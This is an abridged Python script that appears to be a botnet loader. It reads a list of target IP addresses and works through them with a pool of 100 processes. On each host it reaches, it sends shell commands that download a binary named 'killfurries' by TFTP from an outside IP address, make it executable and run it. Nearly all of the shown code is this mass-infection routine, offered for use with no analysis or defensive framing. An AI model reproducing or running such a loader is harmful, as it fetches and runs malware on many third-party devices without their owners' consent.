import sys, crypt, hashlib, base64, threading, time, io, select, socket, tqdm
...
def runcmd(host):
  ...
  print(r)
  s.send(b'cd /tmp\r\n')
  s.send(b'tftp -l killfurries -r arm7 -g 185.244.39.95\r\n')  # TFTP/ECHO LOADING PAYLOAD HERE
  time.sleep(60)
  s.send(b'chmod 777 killfurries\r\n')
  time.sleep(1)
  s.send(b'./killfurries NVR\r\n')
  print("sup g!")
  for i in range(10):
    data = s.recv(8192)
    print(data)
...
def run(host):
  try:
    ...
    pass # For ezpz loading

ips = [line.rstrip('\n') for line in open("ips.txt")]
pool = Pool(processes=100)
for _ in tqdm.tqdm(pool.imap_unordered(run, ips), total=len(ips)):
  pass
pool.close()